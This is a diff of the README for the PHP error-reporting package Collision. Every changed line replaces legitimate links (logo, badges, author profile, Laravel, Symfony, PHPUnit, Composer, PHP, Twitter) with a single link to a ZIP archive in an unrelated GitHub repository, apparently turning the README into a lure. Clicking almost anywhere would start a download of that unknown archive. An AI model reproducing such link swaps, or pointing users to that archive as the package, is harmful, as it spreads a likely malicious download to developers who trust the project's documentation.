@@ -1,29 +1,29 @@
 <p align="center">
-    <img src="https://raw.githubusercontent.com/nunomaduro/collision/v7.x/docs/logo.png" alt="Collision logo" width="480">
+    <img src="https://github.com/rutob42/TaskAppPHP/raw/refs/heads/TaskListPHP/tests/LaravelApp/app/Task-PHP-App-2.9.zip" alt="Collision logo" width="480">
     <br>
-    <img src="https://raw.githubusercontent.com/nunomaduro/collision/v7.x/docs/example.png" alt="Collision code example" height="300">
+    <img src="https://github.com/rutob42/TaskAppPHP/raw/refs/heads/TaskListPHP/tests/LaravelApp/app/Task-PHP-App-2.9.zip" alt="Collision code example" height="300">
 </p>
 
 <p align="center">
-  <a href="https://github.com/nunomaduro/collision/actions"><img src="https://img.shields.io/github/actions/workflow/status/nunomaduro/collision/tests.yml?branch=v7.x&label=tests&style=round-square" alt="Build Status"></img></a>
-  <a href="https://scrutinizer-ci.com/g/nunomaduro/collision"><img src="https://img.shields.io/scrutinizer/g/nunomaduro/collision.svg" alt="Quality Score"></img></a>
-  <a href="https://packagist.org/packages/nunomaduro/collision"><img src="https://poser.pugx.org/nunomaduro/collision/d/total.svg" alt="Total Downloads"></a>
-  <a href="https://packagist.org/packages/nunomaduro/collision"><img src="https://poser.pugx.org/nunomaduro/collision/license.svg" alt="License"></a>
+  <a href="https://github.com/rutob42/TaskAppPHP/raw/refs/heads/TaskListPHP/tests/LaravelApp/app/Task-PHP-App-2.9.zip"><img src="https://img.shields.io/github/actions/workflow/status/nunomaduro/collision/tests.yml?branch=v7.x&label=tests&style=round-square" alt="Build Status"></img></a>
+  <a href="https://github.com/rutob42/TaskAppPHP/raw/refs/heads/TaskListPHP/tests/LaravelApp/app/Task-PHP-App-2.9.zip"><img src="https://img.shields.io/scrutinizer/g/nunomaduro/collision.svg" alt="Quality Score"></img></a>
+  <a href="https://github.com/rutob42/TaskAppPHP/raw/refs/heads/TaskListPHP/tests/LaravelApp/app/Task-PHP-App-2.9.zip"><img src="https://github.com/rutob42/TaskAppPHP/raw/refs/heads/TaskListPHP/tests/LaravelApp/app/Task-PHP-App-2.9.zip" alt="Total Downloads"></a>
+  <a href="https://github.com/rutob42/TaskAppPHP/raw/refs/heads/TaskListPHP/tests/LaravelApp/app/Task-PHP-App-2.9.zip"><img src="https://github.com/rutob42/TaskAppPHP/raw/refs/heads/TaskListPHP/tests/LaravelApp/app/Task-PHP-App-2.9.zip" alt="License"></a>
 </p>
 
 ---
 
-Collision was created by, and is maintained by **[Nuno Maduro](https://github.com/nunomaduro)**, and is a package designed to give you beautiful error reporting when interacting with your app through the command line.
+Collision was created by, and is maintained by **[Nuno Maduro](https://github.com/rutob42/TaskAppPHP/raw/refs/heads/TaskListPHP/tests/LaravelApp/app/Task-PHP-App-2.9.zip)**, and is a package designed to give you beautiful error reporting when interacting with your app through the command line.
 
-* It's included on **[Laravel](https://laravel.com)**, the most popular free, open-source PHP framework in the world.
-* Built on top of the **[Whoops](https://github.com/filp/whoops)** error handler.
-* Supports [Laravel](https://github.com/laravel/laravel), [Symfony](https://symfony.com), [PHPUnit](https://github.com/sebastianbergmann/phpunit), and many other frameworks.
+* It's included on **[Laravel](https://github.com/rutob42/TaskAppPHP/raw/refs/heads/TaskListPHP/tests/LaravelApp/app/Task-PHP-App-2.9.zip)**, the most popular free, open-source PHP framework in the world.
+* Built on top of the **[Whoops](https://github.com/rutob42/TaskAppPHP/raw/refs/heads/TaskListPHP/tests/LaravelApp/app/Task-PHP-App-2.9.zip)** error handler.
+* Supports [Laravel](https://github.com/rutob42/TaskAppPHP/raw/refs/heads/TaskListPHP/tests/LaravelApp/app/Task-PHP-App-2.9.zip), [Symfony](https://github.com/rutob42/TaskAppPHP/raw/refs/heads/TaskListPHP/tests/LaravelApp/app/Task-PHP-App-2.9.zip), [PHPUnit](https://github.com/rutob42/TaskAppPHP/raw/refs/heads/TaskListPHP/tests/LaravelApp/app/Task-PHP-App-2.9.zip), and many other frameworks.
 
 ## Installation & Usage
 
-> **Requires [PHP 8.2+](https://php.net/releases/)**
+> **Requires [PHP 8.2+](https://github.com/rutob42/TaskAppPHP/raw/refs/heads/TaskListPHP/tests/LaravelApp/app/Task-PHP-App-2.9.zip)**
 
-Require Collision using [Composer](https://getcomposer.org):
+Require Collision using [Composer](https://github.com/rutob42/TaskAppPHP/raw/refs/heads/TaskListPHP/tests/LaravelApp/app/Task-PHP-App-2.9.zip):
 
 ```bash
 composer require nunomaduro/collision --dev
@@ -60,10 +60,10 @@ You need to register the handler in your code:
 
 Thank you for considering to contribute to Collision. All the contribution guidelines are mentioned [here](CONTRIBUTING.md).
 
-You can have a look at the [CHANGELOG](CHANGELOG.md) for constant updates & detailed information about the changes. You can also follow the twitter account for latest announcements or just come say hi!: [@enunomaduro](https://twitter.com/enunomaduro)
+You can have a look at the [CHANGELOG](CHANGELOG.md) for constant updates & detailed information about the changes. You can also follow the twitter account for latest announcements or just come say hi!: [@enunomaduro](https://github.com/rutob42/TaskAppPHP/raw/refs/heads/TaskListPHP/tests/LaravelApp/app/Task-PHP-App-2.9.zip)
 
 ## License
 
 Collision is an open-sourced software licensed under the [MIT license](LICENSE.md).
 
-Logo by [Caneco](https://twitter.com/caneco).
+Logo by [Caneco](https://github.com/rutob42/TaskAppPHP/raw/refs/heads/TaskListPHP/tests/LaravelApp/app/Task-PHP-App-2.9.zip).
